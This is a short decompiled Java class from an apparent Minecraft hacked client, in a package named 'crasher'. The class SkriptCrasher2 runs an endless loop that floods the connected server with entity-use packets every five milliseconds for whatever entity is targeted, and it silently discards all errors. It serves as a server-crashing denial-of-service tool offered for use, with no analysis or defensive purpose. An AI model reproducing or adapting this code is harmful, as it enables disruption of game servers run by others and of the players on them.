// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.sc;

import net.minecraft.network.play.client.CPacketUseEntity;
import net.minecraft.client.Minecraft;

public class SkriptCrasher2
{
    public static void start() {
        try {
            while (true) {
                if (Minecraft.getMinecraft().objectMouseOver.entityHit != null) {
                    Minecraft.getMinecraft().getConnection().getNetworkManager().channel.writeAndFlush(new CPacketUseEntity(Minecraft.getMinecraft().objectMouseOver.entityHit));
                }
                Thread.sleep(5L);
            }
        }
        catch (final Throwable throwable) {}
    }
}
